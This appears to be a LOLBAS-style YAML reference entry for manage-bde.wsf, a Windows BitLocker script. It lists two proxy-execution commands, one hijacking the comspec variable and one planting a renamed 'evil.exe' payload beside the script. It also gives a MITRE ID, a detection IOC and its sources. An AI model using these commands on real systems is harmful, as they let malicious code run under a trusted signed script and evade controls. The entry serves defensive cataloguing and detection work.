---
Name: Manage-bde.wsf
Description: Script for managing BitLocker
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf
    Description: Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.
    Usecase: Proxy execution from script
    Category: Execute
    Privileges: User
    MitreID: T1216
    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
    Description: Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.
    Usecase: Proxy execution from script
    Category: Execute
    Privileges: User
    MitreID: T1216
    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\manage-bde.wsf
Code_Sample:
  - Code:
Detection:
  - IOC: Manage-bde.wsf should normally not be invoked by a user
Resources:
  - Link: https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
  - Link: https://twitter.com/bohops/status/980659399495741441
  - Link: https://twitter.com/JohnLaTwC/status/1223292479270600706
Acknowledgement:
  - Person: Jimmy
    Handle: '@bohops'
  - Person: Daniel Bohannon
    Handle: '@danielbohannon'
  - Person: John Lambert
    Handle: '@JohnLaTwC'
---
